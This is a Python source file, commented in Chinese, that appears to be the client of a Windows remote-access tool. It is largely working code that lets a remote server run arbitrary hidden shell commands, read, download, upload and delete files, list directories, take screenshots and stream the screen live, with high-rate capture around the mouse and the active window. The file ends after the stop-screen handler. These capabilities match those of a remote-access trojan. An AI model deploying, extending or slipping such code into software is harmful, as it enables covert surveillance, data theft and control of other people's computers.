import socket
import subprocess
import json
import os
import base64
import time
from PIL import Image
import platform
import shutil
import tkinter as tk
from tkinter import messagebox
import threading
import ctypes
from ttkthemes import ThemedTk
import hashlib
import uuid
from io import BytesIO

# 发送加锁，避免多线程发送数据时内容交叉
SEND_LOCK = threading.Lock()
# 屏幕流控制
_screen_thread = None
_screen_stop_event = threading.Event()

# 混合式视频流控制
_hybrid_stream_enabled = False
_base_layer_thread = None
_enhancement_layer_thread = None
_base_layer_stop_event = threading.Event()
_enhancement_layer_stop_event = threading.Event()

# ROI检测相关
_current_mouse_pos = (0, 0)
_active_window_rect = None
_roi_regions = []

# 虚拟屏常量（用于 ctypes 回退）
SM_XVIRTUALSCREEN = 76
SM_YVIRTUALSCREEN = 77
SM_CXVIRTUALSCREEN = 78
SM_CYVIRTUALSCREEN = 79
# 鼠标事件常量（ctypes 回退）
MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_MIDDLEDOWN = 0x0020
MOUSEEVENTF_MIDDLEUP = 0x0040
MOUSEEVENTF_WHEEL = 0x0800
WHEEL_DELTA = 120
KEYEVENTF_KEYUP = 0x0002

try:
    import win32gui
    import win32ui
    import win32con
    import win32api

    WIN_AVAILABLE = True
except Exception:
    WIN_AVAILABLE = False

# 全局截图缓存 - 简化为仅保留必要信息
_screenshot_cache = {
    'last_cleanup_time': 0,
    'cleanup_interval': 60  # 每60秒强制清理一次
}

def _cleanup_screenshot_cache():
    """清理截图缓存资源 - 简化版本，因为新方法不使用持久缓存"""
    current_time = time.time()
    _screenshot_cache['last_cleanup_time'] = current_time
    
    # 强制垃圾回收，释放可能的内存泄漏
    import gc
    gc.collect()
    
    print(f"[调试] 截图缓存已清理，时间: {current_time}")

def _get_mouse_position():
    """获取当前鼠标位置"""
    global _current_mouse_pos
    try:
        if WIN_AVAILABLE:
            x, y = win32gui.GetCursorPos()
            _current_mouse_pos = (x, y)
            return x, y
        else:
            # 使用ctypes获取鼠标位置
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            
            pt = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
            _current_mouse_pos = (pt.x, pt.y)
            return pt.x, pt.y
    except Exception as e:
        print(f"[错误] 获取鼠标位置失败: {e}")
        return _current_mouse_pos

def _get_active_window_rect():
    """获取活动窗口矩形区域"""
    global _active_window_rect
    try:
        if WIN_AVAILABLE:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd:
                rect = win32gui.GetWindowRect(hwnd)
                _active_window_rect = rect
                return rect
        else:
            # 使用ctypes获取前台窗口
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            if hwnd:
                rect = ctypes.wintypes.RECT()
                ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(rect))
                rect_tuple = (rect.left, rect.top, rect.right, rect.bottom)
                _active_window_rect = rect_tuple
                return rect_tuple
    except Exception as e:
        print(f"[错误] 获取活动窗口失败: {e}")
    return _active_window_rect

def _detect_roi_regions(screen_width, screen_height):
    """检测兴趣区域(ROI)"""
    global _roi_regions
    roi_regions = []
    
    # 1. 鼠标周围区域 (640x360)
    mouse_x, mouse_y = _get_mouse_position()
    roi_width, roi_height = 640, 360
    
    # 确保ROI区域在屏幕范围内
    roi_x = max(0, min(mouse_x - roi_width // 2, screen_width - roi_width))
    roi_y = max(0, min(mouse_y - roi_height // 2, screen_height - roi_height))
    
    mouse_roi = {
        'type': 'mouse',
        'rect': (roi_x, roi_y, roi_x + roi_width, roi_y + roi_height),
        'priority': 1
    }
    roi_regions.append(mouse_roi)
    
    # 2. 活动窗口区域
    active_rect = _get_active_window_rect()
    if active_rect:
        # 限制活动窗口ROI的最大尺寸
        max_roi_width, max_roi_height = 800, 600
        window_width = active_rect[2] - active_rect[0]
        window_height = active_rect[3] - active_rect[1]
        
        # 如果窗口太大，只取中心区域
        if window_width > max_roi_width or window_height > max_roi_height:
            center_x = (active_rect[0] + active_rect[2]) // 2
            center_y = (active_rect[1] + active_rect[3]) // 2
            
            roi_width = min(window_width, max_roi_width)
            roi_height = min(window_height, max_roi_height)
            
            roi_x = max(0, min(center_x - roi_width // 2, screen_width - roi_width))
            roi_y = max(0, min(center_y - roi_height // 2, screen_height - roi_height))
            
            window_roi = {
                'type': 'window',
                'rect': (roi_x, roi_y, roi_x + roi_width, roi_y + roi_height),
                'priority': 2
            }
        else:
            window_roi = {
                'type': 'window',
                'rect': active_rect,
                'priority': 2
            }
        
        # 避免与鼠标ROI重叠太多
        if not _roi_overlap_too_much(mouse_roi['rect'], window_roi['rect']):
            roi_regions.append(window_roi)
    
    _roi_regions = roi_regions
    return roi_regions

def _roi_overlap_too_much(rect1, rect2, threshold=0.7):
    """检查两个ROI区域是否重叠过多"""
    # 计算交集
    x1 = max(rect1[0], rect2[0])
    y1 = max(rect1[1], rect2[1])
    x2 = min(rect1[2], rect2[2])
    y2 = min(rect1[3], rect2[3])
    
    if x2 <= x1 or y2 <= y1:
        return False  # 没有重叠
    
    # 计算重叠面积
    overlap_area = (x2 - x1) * (y2 - y1)
    
    # 计算较小矩形的面积
    area1 = (rect1[2] - rect1[0]) * (rect1[3] - rect1[1])
    area2 = (rect2[2] - rect2[0]) * (rect2[3] - rect2[1])
    smaller_area = min(area1, area2)
    
    # 如果重叠面积超过较小矩形的70%，认为重叠过多
    return overlap_area / smaller_area > threshold

def _periodic_cleanup():
    """定期清理函数，防止资源累积"""
    current_time = time.time()
    if (current_time - _screenshot_cache['last_cleanup_time'] > _screenshot_cache['cleanup_interval']):
        _cleanup_screenshot_cache()

def take_screenshot_region(region_rect=None):
    """截取指定区域的屏幕截图"""
    if region_rect is None:
        return take_screenshot()
    
    try:
        # 获取完整屏幕截图
        full_screenshot = take_screenshot()
        if full_screenshot is None:
            return None
        
        # 裁剪指定区域
        x1, y1, x2, y2 = region_rect
        
        # 确保坐标在有效范围内
        screen_width, screen_height = full_screenshot.size
        x1 = max(0, min(x1, screen_width))
        y1 = max(0, min(y1, screen_height))
        x2 = max(x1, min(x2, screen_width))
        y2 = max(y1, min(y2, screen_height))
        
        if x2 <= x1 or y2 <= y1:
            return None
        
        # 裁剪图像
        cropped = full_screenshot.crop((x1, y1, x2, y2))
        return cropped
        
    except Exception as e:
        print(f"[错误] 区域截图失败: {e}")
        return None

def take_screenshot():
    # 添加失败计数器，避免频繁重试pywin32
    if not hasattr(take_screenshot, '_pywin32_failures'):
        take_screenshot._pywin32_failures = 0
        take_screenshot._last_failure_time = 0
    
    # 如果pywin32连续失败太多次，暂时使用ImageGrab
    current_time = time.time()
    if (take_screenshot._pywin32_failures >= 5 and 
        current_time - take_screenshot._last_failure_time < 30):  # 30秒内不重试pywin32
        # 直接使用ImageGrab
        return _take_screenshot_imagegrab()
    
    # 优先使用 pywin32 截屏（性能更好，支持多显示器虚拟屏）
    if WIN_AVAILABLE:
        try:
            # 只在第一次调用时设置DPI感知
            if not hasattr(take_screenshot, '_dpi_set'):
                try:
                    ctypes.windll.user32.SetProcessDPIAware()
                    take_screenshot._dpi_set = True
                except AttributeError:
                    take_screenshot._dpi_set = True
            
            # 使用更简单直接的方法，避免复杂的缓存机制
            hdesktop = win32gui.GetDesktopWindow()
            
            # 获取主显示器尺寸而不是虚拟屏幕，减少复杂性
            width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
            height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
            
            # 验证屏幕尺寸有效性
            if width <= 0 or height <= 0:
                raise RuntimeError(f"Invalid screen dimensions: {width}x{height}")
            
            # 每次都创建新的DC，避免缓存导致的问题
            desktop_dc = win32gui.GetWindowDC(hdesktop)
            if not desktop_dc:
                raise RuntimeError("Failed to get desktop window DC")
            
            try:
                img_dc = win32ui.CreateDCFromHandle(desktop_dc)
                mem_dc = img_dc.CreateCompatibleDC()
                
                screenshot_bitmap = win32ui.CreateBitmap()
                screenshot_bitmap.CreateCompatibleBitmap(img_dc, width, height)
                
                old_bitmap = mem_dc.SelectObject(screenshot_bitmap)
                
                # 执行截图
                result = mem_dc.BitBlt((0, 0), (width, height), img_dc, (0, 0), win32con.SRCCOPY)
                if not result:
                    raise RuntimeError("BitBlt operation failed")
                
                # 获取位图数据
                bmpinfo = screenshot_bitmap.GetInfo()
                bmpstr = screenshot_bitmap.GetBitmapBits(True)
                
                if not bmpstr:
                    raise RuntimeError("Failed to get bitmap bits")
                
                # 创建图像
                img = Image.frombuffer('RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), 
                                     bmpstr, 'raw', 'BGRX', 0, 1)
                
                # 清理资源
                mem_dc.SelectObject(old_bitmap)
                win32gui.DeleteObject(screenshot_bitmap.GetHandle())
                mem_dc.DeleteDC()
                img_dc.DeleteDC()
                
                # 重置失败计数器
                take_screenshot._pywin32_failures = 0
                return img
                
            finally:
                # 确保释放桌面DC
                win32gui.ReleaseDC(hdesktop, desktop_dc)
                
        except Exception as e:
            take_screenshot._pywin32_failures += 1
            take_screenshot._last_failure_time = current_time
            print(f"[警告] pywin32截图失败 (失败次数: {take_screenshot._pywin32_failures}): {e}")
            
            # 如果失败次数较少，立即回退到ImageGrab
            if take_screenshot._pywin32_failures < 3:
                print("[信息] 立即回退到ImageGrab")
    
    # 回退方案：使用ImageGrab
    return _take_screenshot_imagegrab()

def _take_screenshot_imagegrab():
    """使用PIL ImageGrab进行截图的独立函数"""
    try:
        # 设置DPI感知
        if not hasattr(_take_screenshot_imagegrab, '_dpi_set'):
            try:
                ctypes.windll.user32.SetProcessDPIAware()
                _take_screenshot_imagegrab._dpi_set = True
            except AttributeError:
                _take_screenshot_imagegrab._dpi_set = True
        
        from PIL import ImageGrab
        # 使用bbox参数限制截图区域，提高性能
        return ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=False)
    except Exception as e:
        raise RuntimeError(f"ImageGrab screenshot failed: {e}")


def reliable_send(sock, data_dict):
    """将字典可靠地编码为JSON并附加换行符后发送（线程安全，优化版本）"""
    try:
        # 使用更快的JSON编码选项
        json_data = json.dumps(data_dict, separators=(',', ':'), ensure_ascii=False).encode('utf-8') + b'\n'
        with SEND_LOCK:
            # 设置TCP_NODELAY以减少延迟
            try:
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except:
                pass  # 忽略设置失败
            sock.sendall(json_data)
    except socket.error as e:
        print(f"[错误] 发送数据时发生Socket错误: {e}")
        raise


# --- command handlers (mapping) ---
def handle_cd(arg, state):
    if not arg:
        return {"output": "错误: 'cd' 需要目录参数。"}
    try:
        os.chdir(arg)
        state['cwd'] = os.getcwd()
        return {"output": f"已切换目录到: {state['cwd']}"}
    except Exception as e:
        return {"output": f"切换目录错误: {e}"}


def handle_download(arg, state):
    if not arg:
        return {"output": "错误: 'download' 需要文件路径。"}
    if os.path.exists(arg) and os.path.isfile(arg):
        with open(arg, 'rb') as f:
            encoded_content = base64.b64encode(f.read()).decode('utf-8')
        return {"file": os.path.basename(arg), "data": encoded_content, "source_path": arg}
    else:
        return {"output": f"错误: 文件 '{arg}' 不存在。"}


def handle_screenshot(arg, state):
    try:
        img = take_screenshot()
        img_path = "screen_temp.png"
        img.save(img_path)
        with open(img_path, 'rb') as f:
            encoded_img = base64.b64encode(f.read()).decode('utf-8')
        os.remove(img_path)
        return {"file": "screenshot.png", "data": encoded_img}
    except Exception as e:
        return {"output": f"截图失败: {e}"}


def handle_exec(arg, state):
    """把 action 当作可执行命令（cmd /c）"""
    full_command = arg or ""
    try:
        startupinfo = subprocess.STARTUPINFO() if os.name == 'nt' else None
        if startupinfo:
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        if os.name == 'nt':
            result = subprocess.run(['cmd.exe', '/c', full_command], capture_output=True, text=False,
                                    cwd=state['cwd'], timeout=30, check=False, startupinfo=startupinfo)
            output = (result.stdout + result.stderr).decode('gbk', errors='replace')
        else:
            result = subprocess.run(full_command, shell=True, capture_output=True, text=True, cwd=state['cwd'],
                                    timeout=30)
            output = result.stdout + result.stderr
        if not output.strip() and result.returncode != 0:
            output = f"命令执行完毕，退出码: {result.returncode}，但无输出。"
        return {"output": output}
    except Exception as e:
        return {"output": f"执行命令时发生错误: {e}"}


def handle_list_dir(arg, state):
    path = arg or state['cwd']
    try:
        entries = []
        with os.scandir(path) as it:
            for e in it:
                try:
                    stat = e.stat()
                    entries.append({
                        "name": e.name,
                        "is_dir": e.is_dir(),
                        "size": stat.st_size,
                        "mtime": int(stat.st_mtime)
                    })
                except Exception:
                    entries.append({"name": e.name, "is_dir": e.is_dir(), "size": 0, "mtime": 0})
        return {"dir_list": {"cwd": os.path.abspath(path), "entries": entries}}
    except Exception as e:
        return {"output": f"列目录失败: {e}"}


def is_image_file(filename):
    """检查文件是否为图片格式"""
    image_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg', '.ico', '.tiff', '.tif'}
    return os.path.splitext(filename.lower())[1] in image_extensions

def handle_read_file(arg, state):
    if not arg:
        return {"output": "错误: read_file 需要路径参数。"}
    if not os.path.exists(arg) or not os.path.isfile(arg):
        return {"output": f"错误: 文件 '{arg}' 不存在或不是文件。"}
    try:
        size = os.path.getsize(arg)
        
        # 对于图片文件，允许更大的文件大小（最大5MB）
        if is_image_file(arg):
            max_size = 5 * 1024 * 1024  # 5MB
        else:
            max_size = 200 * 1024  # 200KB
            
        if size > max_size:
            return {"output": f"文件过大（{size} bytes），无法直接在线打开。请下载。"}
            
        with open(arg, 'rb') as f:
            raw = f.read()
            
        # 对于图片文件，直接返回Base64编码
        if is_image_file(arg):
            text = base64.b64encode(raw).decode('utf-8')
            return {"file_text": text, "path": arg, "is_base64": True}
            
        # 对于非图片文件，尝试文本解码
        try:
            text = raw.decode('utf-8')
        except:
            try:
                text = raw.decode('gbk', errors='replace')
            except:
                text = base64.b64encode(raw).decode('utf-8')
                return {"file_text": text, "path": arg, "is_base64": True}
        return {"file_text": text, "path": arg, "is_base64": False}
    except Exception as e:
        return {"output": f"读取文件失败: {e}"}


def handle_delete_path(arg, state):
    if not arg:
        return {"output": "错误: delete_path 需要路径参数。"}
    try:
        if os.path.isdir(arg):
            shutil.rmtree(arg)
            return {"output": f"目录已删除: {arg}"}
        elif os.path.isfile(arg):
            os.remove(arg)
            return {"output": f"文件已删除: {arg}"}
        else:
            return {"output": "路径不存在。"}
    except Exception as e:
        return {"output": f"删除失败: {e}"}


def handle_upload_file_chunk(cmd, state):
    filename = cmd.get('filename')
    chunk_index = cmd.get('chunk_index', 0)
    data_b64 = cmd.get('data', '')
    is_last = cmd.get('is_last', False)
    if not filename or data_b64 is None:
        return {"output": "上传块缺少参数。"}
    try:
        mode = 'ab'
        with open(filename, mode) as f:
            f.write(base64.b64decode(data_b64))
        if is_last:
            return {"upload_ack": f"上传完成: {filename}"}
        else:
            return {"output": f"已写入块 {chunk_index} (文件: {filename})"}
    except Exception as e:
        return {"output": f"写入上传文件失败: {e}"}

# ========== 实时屏幕流（Windows） ==========

def _parse_kv_arg(arg: str):
    """解析形如 'fps=10,quality=70,width=1280' 的字符串为字典"""
    params = {}
    if not arg:
        return params
    try:
        for pair in str(arg).split(','):
            if not pair.strip():
                continue
            if '=' in pair:
                k, v = pair.split('=', 1)
                params[k.strip()] = v.strip()
    except Exception:
        pass
    return params


def _get_virtual_screen_metrics():
    """返回 (vx, vy, vw, vh) 对应虚拟屏左上角与宽高（像素）"""
    try:
        ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass
    if platform.system().lower() != 'windows':
        return 0, 0, 0, 0
    if WIN_AVAILABLE:
        vw = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        vh = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        vx = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        vy = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        return vx, vy, vw, vh
    # ctypes 回退
    user32 = ctypes.windll.user32
    vw = user32.GetSystemMetrics(SM_CXVIRTUALSCREEN)
    vh = user32.GetSystemMetrics(SM_CYVIRTUALSCREEN)
    vx = user32.GetSystemMetrics(SM_XVIRTUALSCREEN)
    vy = user32.GetSystemMetrics(SM_YVIRTUALSCREEN)
    return vx, vy, vw, vh


def _screen_stream_loop(sock, stop_event, fps, quality, max_width):
    """屏幕流循环"""
    try:
        target_frame_time = 1.0 / fps
        frame_count = 0
        start_time = time.time()
        last_stats_time = start_time
        
        # 性能统计变量
        total_screenshot_time = 0
        total_scale_time = 0
        total_encode_time = 0
        total_send_time = 0
        
        # 自适应质量控制变量
        performance_samples = []
        quality_adjustment = 0
        last_quality_check = start_time
        
        # 缓存变量，避免重复计算 - 移除不必要的缓存变量
        
        # 跳帧策略变量
        frame_skip_count = 0
        max_frame_skip = 2  # 最多连续跳2帧
        last_process_time = 0
        
        while not stop_event.is_set():
            frame_start = time.time()
            
            # 动态跳帧策略：如果上一帧处理时间过长，跳过当前帧
            if last_process_time > target_frame_time * 1.5 and frame_skip_count < max_frame_skip:
                frame_skip_count += 1
                time.sleep(target_frame_time * 0.5)  # 短暂休息
                continue
            else:
                frame_skip_count = 0
            
            # 截图
            screenshot_start = time.time()
            
            # 定期清理资源
            _periodic_cleanup()
            
            try:
                screenshot = take_screenshot()
            except Exception as e:
                print(f"[错误] 截图失败: {e}")
                # 根据失败类型调整重试间隔
                if "BitBlt" in str(e) or "pywin32" in str(e):
                    time.sleep(1.0)  # pywin32失败时等待更长时间
                else:
                    time.sleep(0.3)  # 其他错误较短等待
                continue
            screenshot_time = (time.time() - screenshot_start) * 1000
            
            # 智能缩放策略 - 简化逻辑提高性能
            scale_start = time.time()
            original_size = screenshot.size
            
            # 只在需要时进行缩放
            if original_size[0] > max_width:
                target_size = (max_width, int(original_size[1] * max_width / original_size[0]))
                # 使用最快的缩放算法
                screenshot = screenshot.resize(target_size, Image.NEAREST)
            
            scale_time = (time.time() - scale_start) * 1000
            
            # 自适应质量控制 - 根据性能动态调整参数
            current_time = time.time()
            frame_process_time = current_time - frame_start
            
            # 收集性能样本
            performance_samples.append(frame_process_time)
            if len(performance_samples) > 10:  # 保持最近10帧的数据
                performance_samples.pop(0)
            
            # 每5秒检查一次性能并调整质量
            if current_time - last_quality_check > 5.0 and len(performance_samples) >= 5:
                avg_frame_time = sum(performance_samples) / len(performance_samples)
                
                if avg_frame_time > target_frame_time * 1.3:  # 性能不佳，降低质量
                    quality_adjustment = min(quality_adjustment + 5, 20)
                elif avg_frame_time < target_frame_time * 0.8:  # 性能良好，提高质量
                    quality_adjustment = max(quality_adjustment - 2, 0)
                
                last_quality_check = current_time
            
            # 应用质量调整
            adjusted_quality = max(25, quality - quality_adjustment)
            
            # 优化编码策略 - 使用更快的压缩设置
            encode_start = time.time()
            
            # 编码为JPEG - 使用最快设置，禁用优化和渐进式
            buffer = BytesIO()
            # 根据图像大小动态调整质量，减少不必要的计算
            if screenshot.size[0] * screenshot.size[1] > 400000:
                jpeg_quality = max(35, adjusted_quality - 10)
            else:
                jpeg_quality = adjusted_quality
            
            screenshot.save(buffer, format='JPEG', quality=jpeg_quality, optimize=False, progressive=False)
            img_data = buffer.getvalue()
            buffer.close()
            
            encode_time = (time.time() - encode_start) * 1000
            
            # 发送数据
            send_start = time.time()
            try:
                # 获取虚拟屏幕信息
                vx, vy, vw, vh = _get_virtual_screen_metrics()
                
                frame_data = {
                    "type": "screen_frame",
                    "data": base64.b64encode(img_data).decode('utf-8'),
                    "w": screenshot.size[0],
                    "h": screenshot.size[1],
                    "vx": vx,
                    "vy": vy,
                    "vw": vw,
                    "vh": vh
                }
                reliable_send(sock, frame_data)
            except Exception as e:
                print(f"[错误] 发送屏幕帧失败: {e}")
                break
            
            send_time = (time.time() - send_start) * 1000
            
            # 更新统计
            frame_count += 1
            total_screenshot_time += screenshot_time
            total_scale_time += scale_time
            total_encode_time += encode_time
            total_send_time += send_time
            
            # 计算当前帧处理时间
            current_process_time = time.time() - frame_start
            last_process_time = current_process_time
            
            # 性能警告和自适应调整
            if current_process_time * 1000 > target_frame_time * 1000 * 1.2:  # 120%阈值
                print(f"[警告] 帧处理时间过长: {current_process_time * 1000:.1f}ms (目标: {target_frame_time * 1000:.1f}ms)")
                
                # 自适应降低帧率
                if hasattr(take_screenshot, '_pywin32_failures') and take_screenshot._pywin32_failures > 0:
                    # 如果是截图问题导致的性能下降，临时降低帧率
                    target_frame_time = min(target_frame_time * 1.1, 1.0)  # 最低1FPS
                    print(f"[自适应] 临时降低帧率，新目标帧时间: {target_frame_time * 1000:.1f}ms")
            
            # 每5秒输出一次性能统计和健康检查
            current_time = time.time()
            if current_time - last_stats_time >= 5.0:
                elapsed = current_time - start_time
                actual_fps = frame_count / elapsed
                avg_screenshot = total_screenshot_time / frame_count
                avg_scale = total_scale_time / frame_count
                avg_encode = total_encode_time / frame_count
                avg_send = total_send_time / frame_count
                
                # 添加截图方法统计
                screenshot_method = "ImageGrab"
                if hasattr(take_screenshot, '_pywin32_failures'):
                    if take_screenshot._pywin32_failures == 0:
                        screenshot_method = "pywin32"
                    elif take_screenshot._pywin32_failures < 5:
                        screenshot_method = f"pywin32(失败{take_screenshot._pywin32_failures}次)"
                    else:
                        screenshot_method = f"ImageGrab(pywin32已禁用)"
                
                print(f"[性能统计] 实际FPS: {actual_fps:.1f} | 截图: {avg_screenshot:.1f}ms({screenshot_method}) | 缩放: {avg_scale:.1f}ms | 编码: {avg_encode:.1f}ms | 发送: {avg_send:.1f}ms")
                
                # 性能健康检查
                if actual_fps < fps * 0.5:  # 实际帧率低于目标的50%
                    print(f"[警告] 性能严重下降，实际FPS({actual_fps:.1f}) < 目标FPS({fps}) * 50%")
                
                last_stats_time = current_time
            
            # 帧率控制 - 更精确的时间控制
            elapsed_frame_time = time.time() - frame_start
            sleep_time = target_frame_time - elapsed_frame_time
            if sleep_time > 0:
                time.sleep(sleep_time)
            
    except Exception as e:
        print(f"[错误] 屏幕流异常: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("[屏幕流] 已停止")
        # 清理截图缓存资源
        _cleanup_screenshot_cache()


def _base_layer_stream_loop(sock, stop_event, fps=8, quality=50, max_width=960):
    """基础层流循环 - 低帧率全屏底图"""
    try:
        target_frame_time = 1.0 / fps
        frame_count = 0
        start_time = time.time()
        last_stats_time = start_time
        
        print(f"[混合流] 基础层启动: {max_width}px @ {fps}fps, 质量={quality}")
        
        while not stop_event.is_set():
            frame_start = time.time()
            
            # 截取全屏
            try:
                screenshot = take_screenshot()
                if screenshot is None:
                    time.sleep(0.5)
                    continue
            except Exception as e:
                print(f"[基础层] 截图失败: {e}")
                time.sleep(0.5)
                continue
            
            # 缩放到目标分辨率 (960x540)
            original_size = screenshot.size
            if original_size[0] > max_width:
                target_height = int(original_size[1] * max_width / original_size[0])
                screenshot = screenshot.resize((max_width, target_height), Image.LANCZOS)
            
            # 编码为JPEG
            buffer = BytesIO()
            screenshot.save(buffer, format='JPEG', quality=quality, optimize=True)
            img_data = buffer.getvalue()
            buffer.close()
            
            # 发送基础层数据
            try:
                vx, vy, vw, vh = _get_virtual_screen_metrics()
                frame_data = {
                    "type": "hybrid_base_frame",
                    "data": base64.b64encode(img_data).decode('utf-8'),
                    "w": screenshot.size[0],
                    "h": screenshot.size[1],
                    "vx": vx, "vy": vy, "vw": vw, "vh": vh,
                    "frame_id": frame_count,
                    "timestamp": time.time()
                }
                reliable_send(sock, frame_data)
                frame_count += 1
                
            except Exception as e:
                print(f"[基础层] 发送失败: {e}")
                break
            
            # 性能统计
            current_time = time.time()
            if current_time - last_stats_time >= 10.0:  # 每10秒输出一次统计
                elapsed = current_time - start_time
                actual_fps = frame_count / elapsed if elapsed > 0 else 0
                print(f"[基础层] 统计: {actual_fps:.1f} FPS, 已发送 {frame_count} 帧")
                last_stats_time = current_time
            
            # 帧率控制
            frame_time = time.time() - frame_start
            sleep_time = target_frame_time - frame_time
            if sleep_time > 0:
                time.sleep(sleep_time)
                
    except Exception as e:
        print(f"[基础层] 流循环异常: {e}")
    finally:
        print("[基础层] 流已停止")

def _enhancement_layer_stream_loop(sock, stop_event, fps=30, quality=70):
    """增强层流循环 - 高帧率ROI区域"""
    try:
        target_frame_time = 1.0 / fps
        frame_count = 0
        start_time = time.time()
        last_stats_time = start_time
        last_roi_update = 0
        
        print(f"[混合流] 增强层启动: ROI @ {fps}fps, 质量={quality}")
        
        while not stop_event.is_set():
            frame_start = time.time()
            
            # 每0.5秒更新一次ROI区域
            current_time = time.time()
            if current_time - last_roi_update > 0.5:
                # 获取屏幕尺寸用于ROI检测
                try:
                    vx, vy, vw, vh = _get_virtual_screen_metrics()
                    roi_regions = _detect_roi_regions(vw, vh)
                    last_roi_update = current_time
                except Exception as e:
                    print(f"[增强层] ROI检测失败: {e}")
                    roi_regions = []
            else:
                roi_regions = _roi_regions
            
            if not roi_regions:
                time.sleep(0.1)
                continue
            
            # 处理每个ROI区域
            for roi in roi_regions:
                if stop_event.is_set():
                    break
                    
                try:
                    # 截取ROI区域
                    roi_screenshot = take_screenshot_region(roi['rect'])
                    if roi_screenshot is None:
                        continue
                    
                    # 编码ROI图像
                    buffer = BytesIO()
                    roi_screenshot.save(buffer, format='JPEG', quality=quality, optimize=True)
                    img_data = buffer.getvalue()
                    buffer.close()
                    
                    # 发送增强层数据
                    frame_data = {
                        "type": "hybrid_enhancement_frame",
                        "data": base64.b64encode(img_data).decode('utf-8'),
                        "w": roi_screenshot.size[0],
                        "h": roi_screenshot.size[1],
                        "roi_rect": roi['rect'],
                        "roi_type": roi['type'],
                        "roi_priority": roi['priority'],
                        "frame_id": frame_count,
                        "timestamp": time.time()
                    }
                    reliable_send(sock, frame_data)
                    frame_count += 1
                    
                except Exception as e:
                    print(f"[增强层] ROI处理失败: {e}")
                    continue
            
            # 性能统计
            if current_time - last_stats_time >= 10.0:  # 每10秒输出一次统计
                elapsed = current_time - start_time
                actual_fps = frame_count / elapsed if elapsed > 0 else 0
                roi_count = len(_roi_regions)
                print(f"[增强层] 统计: {actual_fps:.1f} FPS, {roi_count} ROI区域, 已发送 {frame_count} 帧")
                last_stats_time = current_time
            
            # 帧率控制
            frame_time = time.time() - frame_start
            sleep_time = target_frame_time - frame_time
            if sleep_time > 0:
                time.sleep(sleep_time)
                
    except Exception as e:
        print(f"[增强层] 流循环异常: {e}")
    finally:
        print("[增强层] 流已停止")

def handle_start_hybrid_screen(arg, state):
    """启动混合式视频流"""
    global _hybrid_stream_enabled, _base_layer_thread, _enhancement_layer_thread
    
    if platform.system().lower() != 'windows':
        return {"output": "当前客户端非Windows，无法开启混合屏幕流。"}
    if 'socket' not in state or not state['socket']:
        return {"output": "尚未建立到服务器的套接字，无法开启混合屏幕流。"}
    if _hybrid_stream_enabled:
        return {"output": "混合屏幕流已在运行。"}
    
    # 解析参数
    params = _parse_kv_arg(arg)
    base_fps = int(params.get('base_fps', 8))
    enhancement_fps = int(params.get('enhancement_fps', 30))
    base_quality = int(params.get('base_quality', 50))
    enhancement_quality = int(params.get('enhancement_quality', 70))
    base_width = int(params.get('base_width', 960))
    
    try:
        # 启动基础层
        _base_layer_stop_event.clear()
        _base_layer_thread = threading.Thread(
            target=_base_layer_stream_loop,
            args=(state['socket'], _base_layer_stop_event, base_fps, base_quality, base_width),
            daemon=True
        )
        _base_layer_thread.start()
        
        # 启动增强层
        _enhancement_layer_stop_event.clear()
        _enhancement_layer_thread = threading.Thread(
            target=_enhancement_layer_stream_loop,
            args=(state['socket'], _enhancement_layer_stop_event, enhancement_fps, enhancement_quality),
            daemon=True
        )
        _enhancement_layer_thread.start()
        
        _hybrid_stream_enabled = True
        
        return {"output": f"混合屏幕流已启动 - 基础层: {base_width}px@{base_fps}fps, 增强层: ROI@{enhancement_fps}fps"}
        
    except Exception as e:
        return {"output": f"启动混合屏幕流失败: {e}"}

def handle_stop_hybrid_screen(arg, state):
    """停止混合式视频流"""
    global _hybrid_stream_enabled, _base_layer_thread, _enhancement_layer_thread
    
    _hybrid_stream_enabled = False
    
    # 停止基础层
    _base_layer_stop_event.set()
    if _base_layer_thread and _base_layer_thread.is_alive():
        _base_layer_thread.join(timeout=2)
    _base_layer_thread = None
    
    # 停止增强层
    _enhancement_layer_stop_event.set()
    if _enhancement_layer_thread and _enhancement_layer_thread.is_alive():
        _enhancement_layer_thread.join(timeout=2)
    _enhancement_layer_thread = None
    
    # 清理资源
    _cleanup_screenshot_cache()
    
    return {"output": "混合屏幕流已停止。"}


def handle_start_screen(arg, state):
    global _screen_thread
    # 允许 Windows 平台，即使缺少 pywin32 也可通过 Pillow ImageGrab 回退
    if platform.system().lower() != 'windows':
        return {"output": "当前客户端非Windows，无法开启屏幕流。"}
    if 'socket' not in state or not state['socket']:
        return {"output": "尚未建立到服务器的套接字，无法开启屏幕流。"}
    if _screen_thread and _screen_thread.is_alive():
        return {"output": "屏幕流已在运行。"}
    params = _parse_kv_arg(arg)
    fps = int(params.get('fps', 30))
    quality = int(params.get('quality', 60))
    max_width = int(params.get('width', 1280))
    _screen_stop_event.clear()
    _screen_thread = threading.Thread(
        target=_screen_stream_loop,
        args=(state['socket'], _screen_stop_event, fps, quality, max_width),
        daemon=True
    )
    _screen_thread.start()
    return {"output": f"屏幕流已启动 (fps={fps}, quality={quality}, width={max_width})"}


def handle_stop_screen(arg, state):
    global _screen_thread
    _screen_stop_event.set()
    if _screen_thread and _screen_thread.is_alive():
        _screen_thread.join(timeout=2)
    _screen_thread = None
    
